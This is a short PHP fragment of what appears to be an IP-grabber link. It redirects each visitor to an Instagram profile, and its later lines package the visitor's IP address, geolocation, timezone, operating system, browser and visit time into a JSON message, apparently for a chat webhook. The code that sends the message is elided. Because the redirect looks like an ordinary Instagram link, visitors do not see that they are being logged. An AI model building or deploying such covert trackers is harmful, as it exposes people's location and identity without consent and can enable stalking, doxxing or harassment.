<?php
header( 'Location: https://www.instagram.com/thorsejero/?hl=en' ) ;
...
$make_json = json_encode(array('content'=>"thors Instagram bich  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
